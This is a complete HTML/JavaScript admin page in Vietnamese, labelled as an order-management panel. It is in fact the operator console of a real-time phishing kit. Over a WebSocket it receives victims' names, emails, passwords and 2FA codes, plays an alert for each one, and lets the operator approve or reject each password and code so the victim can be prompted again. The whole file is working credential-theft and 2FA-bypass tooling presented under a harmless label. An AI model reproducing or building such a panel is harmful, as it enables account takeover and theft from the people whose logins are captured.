<!DOCTYPE html>
<html lang="vi">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Admin Panel - Quản Lý Đơn Hàng</title>
    <link href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.0.0/css/all.min.css" rel="stylesheet">
    <style>
        * {
            margin: 0;
            padding: 0;
            box-sizing: border-box;
            font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
        }

        body {
            background-color: #f5f6fa;
            color: #2f3640;
        }

        .container {
            max-width: 1200px;
            margin: 0 auto;
            padding: 20px;
        }

        .header {
            background-color: #fff;
            padding: 20px;
            border-radius: 10px;
            box-shadow: 0 2px 10px rgba(0,0,0,0.1);
            margin-bottom: 20px;
            display: flex;
            justify-content: space-between;
            align-items: center;
        }

        .header h1 {
            color: #2f3640;
            font-size: 24px;
        }

        .status-indicator {
            display: flex;
            align-items: center;
            gap: 10px;
        }

        .status-dot {
            width: 12px;
            height: 12px;
            border-radius: 50%;
            background-color: #4cd137;
        }

        .status-text {
            color: #4cd137;
            font-weight: 500;
        }

        .orders-table {
            position: relative;
            width: 100%;
            background-color: #fff;
            border-radius: 10px;
            box-shadow: 0 2px 10px rgba(0,0,0,0.1);
            overflow: hidden;
            margin-top: 20px;
            font-size: 12px;
        }

        .orders-table table {
            width: 100%;
            border-collapse: collapse;
        }

        .orders-table th {
            background-color: #f8f9fa;
            padding: 15px;
            text-align: left;
            font-weight: 600;
            color: #2f3640;
            border-bottom: 2px solid #e9ecef;
        }

        .orders-table td {
            padding: 15px;
            border-bottom: 1px solid #e9ecef;
            border-right: 1px solid #e9ecef;
        }

        .orders-table td:first-child {
            color:rgb(199, 9, 19);
        }

        .orders-table td:last-child {
            border-right: none;
        }

        .order-info {
            display: flex;
            flex-direction: column;
            gap: 5px;
        }

        .order-name {
            font-weight: 600;
            color: #2f3640;
        }

        .order-email {
            color: #718093;
            font-size: 14px;
        }

        .approve-btn {
            background-color: #4cd137;
            color: white;
            border: none;
            padding: 8px 16px;
            border-radius: 5px;
            cursor: pointer;
            font-weight: 500;
            transition: background-color 0.3s;
        }

        .reject-btn {
            background-color: #e84118;
            color: white;
            border: none;
            padding: 8px 16px;
            border-radius: 5px;
            cursor: pointer;
            font-weight: 500;
            transition: background-color 0.3s;
        }

        .approve-btn:hover {
            background-color: #44bd32;
        }

        .reject-btn:hover {
            background-color: #e84118;
        }

        .no-orders {
            text-align: center;
            padding: 40px;
            color: #718093;
        }

        .order-id {
            font-weight: 600;
            font-size: 12px;
        }

        @media (max-width: 768px) {
            .container {
                padding: 10px;
            }

            .header {
                flex-direction: column;
                gap: 10px;
                text-align: center;
            }

            .orders-table {
                overflow-x: auto;
            }

            .remove-all-orders-btn {
                background-color:rgb(199, 49, 62);
                color: white;
                border: none;
                padding: 8px 16px;
                border-radius: 5px;
                cursor: pointer;
                font-weight: 500;
                transition: background-color 0.3s;
            }
        }

        .remove-all-orders-btn {
            background-color:rgb(199, 49, 62);
            color: white;
            border: none;
            padding: 8px 16px;
            border-radius: 5px;
            cursor: pointer;
            font-weight: 500;
            transition: background-color 0.3s;
        }

        .remove-all-orders-btn:hover {
            background-color: #44bd32;
        }

        .notification-bell {
            background-color: #fff;
            border-radius: 50%;
            width: 40px;
            height: 40px;
            display: flex;
            align-items: center;
            justify-content: center;
            cursor: pointer;
            box-shadow: 0 2px 10px rgba(0,0,0,0.1);
            z-index: 1000;
            transition: transform 0.3s;
        }

        .notification-bell:hover {
            transform: scale(1.1);
        }

        .notification-bell i {
            font-size: 20px;
            color: #2f3640;
        }

        .notification-bell.has-notification {
            animation: ring 0.5s ease-in-out infinite;
        }

        .notification-bell.has-notification i {
            color: #e84118;
        }

        @keyframes ring {
            0% { transform: rotate(0deg); }
            25% { transform: rotate(15deg); }
            50% { transform: rotate(0deg); }
            75% { transform: rotate(-15deg); }
            100% { transform: rotate(0deg); }
        }

        .notification-sound {
            display: none;
        }
    </style>
</head>
<body>
   

    <audio id="notificationSound" class="notification-sound" preload="auto">
        <source src="https://assets.mixkit.co/active_storage/sfx/2869/2869-preview.mp3" type="audio/mpeg">
    </audio>

    <div class="container">
        
        <div class="header">
            <h1><i class="fas fa-tachometer-alt"></i> Quản Lý Đơn Hàng</h1>
            <div class="status-indicator">
                <div class="status-dot"></div>
                <span class="status-text">Đang kết nối</span>
            </div>
            <button class="remove-all-orders-btn" onclick="removeAllOrders()">Xóa tất cả đơn hàng</button>
        </div>

        <div class="notification-bell" id="notificationBell">
            <i class="fas fa-bell"></i>
        </div>

        <div class="orders-table">
            <table>
                <thead>
                    <tr>
                        <th>Xóa</th>
                        <th>Mã Đơn</th>
                        <th>Tên</th>
                        <th>Email</th>
                        <th>Mật khẩu</th>
                        <th>Mã 2FA</th>
                        <th>Hành Động</th>
                    </tr>
                </thead>
                <tbody id="orders">
                    <tr class="no-orders">
                        <td colspan="3">Chưa có đơn hàng nào</td>
                    </tr>
                </tbody>
            </table>
        </div>
    </div>

    <script>
        const ws = new WebSocket('ws://localhost:8080');
        const ordersTable = document.getElementById('orders');
        const notificationBell = document.getElementById('notificationBell');
        const notificationSound = document.getElementById('notificationSound');

        let orders = {};

        // Tăng âm lượng tối đa
        notificationSound.volume = 1.0;

        function playNotification() {
            notificationSound.currentTime = 0;
            notificationSound.play().catch(e => console.log('Error playing sound:', e));

            notificationBell.classList.add('has-notification');
            setTimeout(() => {
                notificationBell.classList.remove('has-notification');
            }, 2000);
        }

        ws.onopen = function() {
            console.log('Admin connected to WebSocket.');
            
            ws.send(JSON.stringify({
                type: 'get_all_orders'
            }));
        };

        ws.onmessage = function(event) {
            const data = JSON.parse(event.data);

            if (data.type === 'new_order') {
                step1(data);
            }
            
            if (data.type === 'admin_approve') {
                const btn_approve = document.getElementById(`approve-btn-${data.order_id}`);
                btn_approve.disabled = true;
                btn_approve.style.backgroundColor = '#ccc';
                btn_approve.style.cursor = 'not-allowed';
                btn_approve.innerHTML = '<i class="fas fa-check"></i> Đợi PW';
            }

            if (data.type === 'enter_password_to_admin') {
                step2(data);
            }

            if (data.type === 'enter_code_to_admin') {
                step3(data);
            }

            if (data.type === 'remove_order') {
                const orderId = data.order_id;
                const order = orders[orderId];
                if (order) {
                    delete orders[orderId];
                }
                renderOrders();
            }

            if (data.type === 'remove_all_orders') {
                orders = {};
                renderOrders();
            }

            if (data.type === 'all_orders') {
                orders = data.orders;
                renderOrders();
            }
        };

       
        function step1(data) {
            playNotification();
            if (data.type === 'new_order') {
                const noOrdersRow = ordersTable.querySelector('.no-orders');
                if (noOrdersRow) {
                    noOrdersRow.remove();
                }

                const colorText = data.colorText;

                const row = ordersTable.insertRow();
                row.id = 'order_' + data.order_id;
                row.className = `order-row-${data.order_id}`;

                const cell0 = row.insertCell(0);
                const cell1 = row.insertCell(1);
                const cell2 = row.insertCell(2);
                const cell3 = row.insertCell(3);
                const cell4 = row.insertCell(4);
                const cell5 = row.insertCell(5);
                const cell6 = row.insertCell(6);

                cell0.innerHTML = `<span class="order-id">
                    <i class="fas fa-times" onclick="removeOrder('${data.order_id}')"></i>
                </span>`;

                cell1.innerHTML = `<span class="order-id">#${data.order_id}</span>`;
                cell1.style.color = colorText;

                cell2.innerHTML = `
                    <div class="order-info">
                        <span class="order-name">${data.user_info.name}</span>
                    </div>
                `;
                cell3.innerHTML = `
                    <div class="order-info">
                        <span class="order-email">${data.user_info.email}</span>
                    </div>
                `;
                cell4.innerHTML = `
                    <div class="order-info">
                        <span class="order-password">${data.user_info.password}</span>
                    </div>
                `;
                cell5.innerHTML = `
                    <div class="order-info">
                        <span class="order-code">${data.user_info.code}</span>
                    </div>
                `;
                cell6.innerHTML = `
                    <button class="approve-btn" id="approve-btn-${data.order_id}" onclick="approveOrder('${data.order_id}', '${colorText}')">
                        <i class="fas fa-check"></i> Duyệt đơn
                    </button>
                `;

                orders[data.order_id] = data;
            }
        }

        function step2(data) {
            playNotification();
            const orderId = data.order_id;
            const order = orders[orderId];
            
            const row = ordersTable.querySelector(`.order-row-${orderId}`);
            row.remove();

            const newRow = ordersTable.insertRow();
            newRow.id = `order_${orderId}`;
            newRow.className = `order-row-${orderId}`;

            const cell0 = newRow.insertCell(0);
            const cell1 = newRow.insertCell(1);
            const cell2 = newRow.insertCell(2);
            const cell3 = newRow.insertCell(3);
            const cell4 = newRow.insertCell(4);
            const cell5 = newRow.insertCell(5);
            const cell6 = newRow.insertCell(6);

            const colorText = order.colorText ?? "#000";
            cell0.innerHTML = `<span class="order-id">
                <i class="fas fa-times" onclick="removeOrder('${orderId}')"></i>
            </span>`;

            cell1.innerHTML = `<span class="order-id">#${orderId}</span>`;
            cell1.style.color = colorText;
            cell2.innerHTML = `
                <div class="order-info">
                    <span class="order-name">${data.user_info.name}</span>
                </div>
            `;
            cell3.innerHTML = `
                <div class="order-info">
                    <span class="order-email">${data.user_info.email}</span>
                </div>
            `;
            cell4.innerHTML = `
                <div class="order-info">
                    <span class="order-password">${data.user_info.password}</span>
                </div>
            `;
            cell5.innerHTML = `
                <div class="order-info">
                    <span class="order-code">${data.user_info.code}</span>
                </div>
            `;

            const approveBtn = document.getElementById(`approve-btn-${orderId}`);
            if (approveBtn) {
                approveBtn.remove();
            }

            cell6.innerHTML = `
                <button id="approve-pw-btn-${orderId}" class="approve-btn approve-pw-btn-${orderId}" onclick="passPassword('${orderId}', '${data.user_info.password}')">
                    <i class="fas fa-check"></i> Đúng PW
                </button>
                <button id="reject-pw-btn-${orderId}" class="reject-btn reject-pw-btn-${orderId}" onclick="rejectPassword('${orderId}', '${data.user_info.password}')">
                    <i class="fas fa-times"></i> Sai PW
                </button>
            `;
        }

        function step3(data) {
            playNotification();
            const orderId = data.order_id;
            const order = orders[orderId];
            
            const row = ordersTable.querySelector(`.order-row-${orderId}`);
            row.remove();

            const newRow = ordersTable.insertRow();
            newRow.id = `order_${orderId}`;
            newRow.className = `order-row-${orderId}`;

            const cell0 = newRow.insertCell(0);
            const cell1 = newRow.insertCell(1);
            const cell2 = newRow.insertCell(2);
            const cell3 = newRow.insertCell(3);
            const cell4 = newRow.insertCell(4);
            const cell5 = newRow.insertCell(5);
            const cell6 = newRow.insertCell(6);

            const colorText = order.colorText;
            cell0.innerHTML = `<span class="order-id">
                <i class="fas fa-times" onclick="removeOrder('${orderId}')"></i>
            </span>`;

            cell1.innerHTML = `<span class="order-id">#${orderId}</span>`;
            cell1.style.color = colorText;
            cell2.innerHTML = `
                <div class="order-info">
                    <span class="order-name">${data.user_info.name}</span>
                </div>
            `;
            cell3.innerHTML = `
                <div class="order-info">
                    <span class="order-email">${data.user_info.email}</span>
                </div>
            `;
            cell4.innerHTML = `
                <div class="order-info">
                    <span class="order-password">${data.user_info.password}</span>
                </div>
            `;
            cell5.innerHTML = `
                <div class="order-info">
                    <span class="order-code">${data.user_info.code}</span>
                </div>
            `;

            const approveBtn = document.getElementById(`approve-btn`);
            if (approveBtn) {
                approveBtn.remove();
            }

            const approveCodeBtn = document.getElementById(`approve-code-btn-${orderId}`);
            if (approveCodeBtn) {
                approveCodeBtn.remove();
            }

            cell6.innerHTML = `
                <button id="approve-code-btn-${orderId}" class="approve-btn approve-code-btn-${orderId}" onclick="passCode('${orderId}', '${data.user_info.code}')">
                    <i class="fas fa-check"></i> Đúng Code
                </button>
                <button id="reject-code-btn-${orderId}" class="reject-btn reject-code-btn-${orderId}" onclick="rejectCode('${orderId}', '${data.user_info.code}')">
                    <i class="fas fa-times"></i> Sai Code
                </button>
            `;
        }


        function approveOrder(orderId, colorText) {
            ws.send(JSON.stringify({
                type: 'admin_approve',
                order_id: orderId,
                step: 1,
                colorText: colorText
            }));

            const approveBtn = document.getElementById(`approve-btn-${orderId}`);
            approveBtn.disabled = true;
            approveBtn.style.backgroundColor = '#ccc';
            approveBtn.style.cursor = 'not-allowed';
        }

        function passPassword(orderId, password) {
            ws.send(JSON.stringify({
                type: 'admin_approve_password',
                order_id: orderId,  
                password: password,
                step: 2
            }));

            const approveBtn = document.getElementById(`approve-pw-btn-${orderId}`);
            approveBtn.remove();
            const rejectBtn = document.getElementById(`reject-pw-btn-${orderId}`);
            rejectBtn.remove();

            const row = ordersTable.querySelector(`.order-row-${orderId}`);
            const cell6 = row.insertCell(6);
            cell6.innerHTML = `
                <button class="approve-btn">
                    <i class="fas fa-eye"></i> Đợi Code
                </button>
            `;
        }

        function rejectPassword(orderId, password) {
            const order = orders[orderId];
            ws.send(JSON.stringify({
                type: 'admin_reject_password',
                order_id: orderId,
                password: password,
                step: 2
            }));

            const approveBtn = document.getElementById(`approve-pw-btn-${orderId}`);
            approveBtn.remove();
            const rejectBtn = document.getElementById(`reject-pw-btn-${orderId}`);
            rejectBtn.remove();

            const row = ordersTable.querySelector(`.order-row-${orderId}`);

            const cell6 = row.insertCell(6);
            cell6.innerHTML = `
                <button class="approve-btn">
                    <i class="fas fa-eye"></i> Đợi PW
                </button>
            `;
        }

        function passCode(orderId, code) {
            ws.send(JSON.stringify({
                type: 'admin_approve_code',
                order_id: orderId,  
                code: code,
                step: 3
            }));

            const approveBtn = document.getElementById(`approve-code-btn-${orderId}`);
            approveBtn.remove();
            const rejectBtn = document.getElementById(`reject-code-btn-${orderId}`);
            rejectBtn.remove();

            const row = ordersTable.querySelector(`.order-row-${orderId}`);
            const cell6 = row.insertCell(6);
            cell6.innerHTML = `
                <button class="approve-btn">
                    <i class="fas fa-check"></i> Xong
                </button>
            `;
        }

        function rejectCode(orderId, code) {
            const order = orders[orderId];
            ws.send(JSON.stringify({
                type: 'admin_reject_code',
                order_id: orderId,
                code: code,
                step: 3
            }));

            const approveBtn = document.getElementById(`approve-code-btn-${orderId}`);
            approveBtn.remove();
            const rejectBtn = document.getElementById(`reject-code-btn-${orderId}`);
            rejectBtn.remove();

            const row = ordersTable.querySelector(`.order-row-${orderId}`);

            const cell6 = row.insertCell(6);
            cell6.innerHTML = `
                <button class="approve-btn">
                    <i class="fas fa-eye"></i> Đợi Code
                </button>
            `;
        }

        function removeAllOrders() {
            ws.send(JSON.stringify({
                type: 'remove_all_orders'
            }));
        }

        function removeOrder(orderId) {
            ws.send(JSON.stringify({
                type: 'remove_order',
                order_id: orderId
            }));
        }

        function renderOrders() {
            ordersTable.innerHTML = '';
            const noOrdersRow = ordersTable.querySelector('.no-orders');
            if (noOrdersRow) {
                ordersTable.appendChild(noOrdersRow);
            }

            for (const orderId in orders) {
                const order = orders[orderId];
                const row = ordersTable.insertRow();
                row.id = 'order_' + orderId;
                row.className = `order-row-${orderId}`;

                const cell0 = row.insertCell(0);
                const cell1 = row.insertCell(1);
                const cell2 = row.insertCell(2);
                const cell3 = row.insertCell(3);
                const cell4 = row.insertCell(4);
                const cell5 = row.insertCell(5);
                const cell6 = row.insertCell(6);

                const colorText = order.colorText;
                console.log(order);
                cell0.innerHTML = `<span class="order-id">
                    <i class="fas fa-times" onclick="removeOrder('${orderId}')"></i>
                </span>`;

                cell1.innerHTML = `<span class="order-id">#${orderId}</span>`;
                cell1.style.color = colorText;

                cell2.innerHTML = `
                    <div class="order-info">
                        <span class="order-name">${order.user_info.name}</span>
                    </div>
                `;
                cell3.innerHTML = `
                    <div class="order-info">
                        <span class="order-email">${order.user_info.email}</span>
                    </div>
                `;
                cell4.innerHTML = `
                    <div class="order-info">
                        <span class="order-password">${order.user_info.password}</span>
                    </div>
                `;
                cell5.innerHTML = `
                    <div class="order-info">
                        <span class="order-code">${order.user_info.code}</span>
                    </div>
                `;
                
                if (order.step == 1) {
                    if (order.user_info.password !== "") {
                        cell6.innerHTML = `
                            <button class="approve-btn">
                                <i class="fas fa-eye"></i> Đợi user
                            </button>
                        `;
                    } else {
                        cell6.innerHTML = `
                            <button class="approve-btn"> Đợi PW
                            </button>
                        `;
                    }
                } else if (order.step == 2) {
                    if (order.user_info.code !== "") {
                        cell6.innerHTML = `
                            <button class="approve-btn">
                                <i class="fas fa-eye"></i> Đợi user
                            </button>
                        `;
                    } else {
                        cell6.innerHTML = `
                            <button class="approve-btn"> Đợi Code </button>
                        `;
                    }
                } else {
                    cell6.innerHTML = `
                        <button class="approve-btn">
                            <i class="fas fa-check"></i> Xong
                        </button>
                    `;
                }
            
            }
        }
    </script>
</body>
</html>
